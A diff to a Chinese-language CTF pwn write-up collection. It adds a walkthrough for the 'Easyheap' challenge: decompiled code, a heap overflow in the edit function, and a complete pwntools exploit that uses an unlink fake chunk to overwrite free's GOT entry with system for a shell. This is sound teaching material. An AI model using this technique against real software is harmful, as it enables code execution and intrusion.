@@ -58,7 +58,7 @@ io.interactive()
 ```python
 from pwn import *
 
-context(os="linux", arch="amd64", log_level='debug')
+context(os='linux', arch='amd64', log_level='debug')
 # io = process('ret2shellcode')
 io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
 io.recvuntil(b'[')
@@ -1498,7 +1498,7 @@ io.interactive()
 ```python
 from pwn import *
 
-context(os="linux", arch="amd64", log_level='debug')
+context(os='linux', arch='amd64', log_level='debug')
 # io = process('ret2text')
 io = remote('pwn.challenge.ctf.show', 28067)
 e = ELF('ret2text')
@@ -2105,6 +2105,268 @@ io.interactive()
 ```
 
 ![](https://paper.tanyaodan.com/PwnTheBox/524/1.png)
+
+------
+
+### [Easyheap](https://ce.pwnthebox.com/challenges?type=4&id=1387)
+
+先`file ./easyheap `查看文件类型，再`checksec --file=./easyheap `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./easyheap            
+./easyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=474c468173fd4e4bf36f20820d6fc2c3b5abed7a, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./easyheap 
+[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开`easyheap`后按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, buf, 8uLL);
+      v3 = atoi(buf);
+      if ( v3 != 3 )
+        break;
+      delete_heap();
+    }
+    if ( v3 > 3 )
+    {
+      if ( v3 == 4 )
+        exit(0);
+      if ( v3 == 4869 )
+      {
+        if ( (unsigned __int64)magic <= 0x1305 )
+        {
+          puts("So sad !");
+        }
+        else
+        {
+          puts("Congrt !");
+          l33t();
+        }
+      }
+      else
+      {
+LABEL_17:
+        puts("Invalid Choice");
+      }
+    }
+    else if ( v3 == 1 )
+    {
+      create_heap();
+    }
+    else
+    {
+      if ( v3 != 2 )
+        goto LABEL_17;
+      edit_heap();
+    }
+  }
+}
+```
+
+双击`menu()`函数查看详情，发现该程序的功能如下：`1`创建堆，`2`修改堆，`3`删除堆。
+
+```c
+int menu()
+{
+  puts("--------------------------------");
+  puts("       Easy Heap Creator       ");
+  puts("--------------------------------");
+  puts(" 1. Create a Heap               ");
+  puts(" 2. Edit a Heap                 ");
+  puts(" 3. Delete a Heap               ");
+  puts(" 4. Exit                        ");
+  puts("--------------------------------");
+  return printf("Your choice :");
+}
+```
+
+双击`create_heap()`函数查看详情，发现最多创建`10`个`chunk`，`heaparray[i]`用来存放`chunk`的地址，`heaparray`是存放在`.bss`段上的，`read_input(heaparray[i], size);`用来向`chunk`中写入`size`大小的内容。
+
+```c
+unsigned __int64 create_heap()
+{
+  int i; // [rsp+4h] [rbp-1Ch]
+  size_t size; // [rsp+8h] [rbp-18h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !*(&heaparray + i) )    // if(!heaparray[i])
+    {
+      printf("Size of Heap : ");
+      read(0, buf, 8uLL);
+      size = atoi(buf);
+      *(&heaparray + i) = malloc(size);
+      if ( !*(&heaparray + i) )
+      {
+        puts("Allocate Error");
+        exit(2);
+      }
+      printf("Content of heap:");
+      read_input(*(&heaparray + i), size);  // read_input(heaparray[i], size);
+      puts("SuccessFul");
+      return __readfsqword(0x28u) ^ v4;
+    }
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+双击`edit_heap()`函数查看详情，`read_input(heaparray[v1], v2);`向`chunk`中写入`v2`大小的内容，如果`v2`比`create_heap()`中创建堆时的`size`更大的话就能形成堆溢出漏洞。
+
+```c
+unsigned __int64 edit_heap()
+{
+  int v1; // [rsp+4h] [rbp-1Ch]
+  __int64 v2; // [rsp+8h] [rbp-18h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, buf, 4uLL);
+  v1 = atoi(buf);
+  if ( v1 < 0 || v1 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( *(&heaparray + v1) )
+  {
+    printf("Size of Heap : ");
+    read(0, buf, 8uLL);
+    v2 = atoi(buf);
+    printf("Content of heap : ");
+    read_input(*(&heaparray + v1), v2);  // read_input(heaparray[v1], v2); 
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+双击`delete_heap()`函数查看详情，`free(heaparray[v1]);`将释放掉`heaparray[v1]`所对应的`chunk`，`heaparray[v1]=0LL;`将指针置为`0`，因此不存在`UAF`。
+
+```c
+unsigned __int64 delete_heap()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, buf, 4uLL);
+  v1 = atoi(buf);
+  if ( v1 < 0 || v1 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( *(&heaparray + v1) )
+  {
+    free(*(&heaparray + v1));   // free(heaparray[v1]);
+    *(&heaparray + v1) = 0LL;   // heaparray[v1] = 0LL;
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+此外，注意到`l33t()`函数能直接调用`cat /home/pwn/flag`，但是它会报错`cat: /home/pwn/flag: No such file or directory`。
+
+```c
+int l33t()
+{
+  return system("cat /home/pwn/flag");
+}
+```
+
+如果程序开启了`PIE`保护的话，在每次加载程序时都变换加载地址，该程序`No PIE`说明未开启地址无关可执行。根据以上分析可知该程序的堆是存放在`.bss`段上的，且存在堆溢出，我们可以尝试修改`free`的`got`表，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10428`，发送`payload`即可得到`PTB{115d0d71-b9b7-4dcc-9df6-ced7635a87d1}`。
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10428)
+e = ELF('./easyheap')
+
+def create(size,content):
+    io.sendlineafter(b'Your choice :', b'1')
+    io.recvuntil('Size of Heap : ')
+    io.sendline(str(size))
+    io.recvuntil('Content of heap:')
+    io.sendline(content)
+
+def edit(index, size, content):
+    io.sendlineafter(b'Your choice :', b'2')
+    io.recvuntil('Index :')
+    io.sendline(str(index))
+    io.recvuntil('Size of Heap : ')
+    io.sendline(str(size))
+    io.recvuntil('Content of heap : ')
+    io.sendline(content)
+
+def delete(index):
+    io.sendlineafter(b'Your choice :', b'3')
+    io.recvuntil('Index :')
+    io.sendline(str(index))
+
+heaparray_creater = 0x6020E0
+system_plt = e.plt['system']
+free_got = e.got['free']
+
+# 先创建3个chunk
+create(0x90,b'aaaa') #chunk0
+create(0x90,b'bbbb') #chunk1
+create(0x20,b'/bin/sh\x00') #chunk2
+
+# 编辑chunk0 构造出一个fake_chunk, 用于在释放chunk1时方便chunk1和fake_chunk进行合并
+fake_chunk = p64(0) + p64(0x91) + p64(heaparray_creater-0x18) + p64(heaparray_creater-0x10)
+fake_chunk = fake_chunk.ljust(0x90, b'a')
+fake_chunk += p64(0x90) + p64(0xa0)
+edit(0,0x100,fake_chunk)
+delete(1)
+payload = p64(0)*3 +p64(free_got)
+edit(0,0x20 ,payload)
+# 将free_got修改成system_plt, 这样在执行delete()时真正执行的就是system
+edit(0,8,p64(system_plt))
+delete(2)
+
+io.interactive()
+```
 
 ------
 
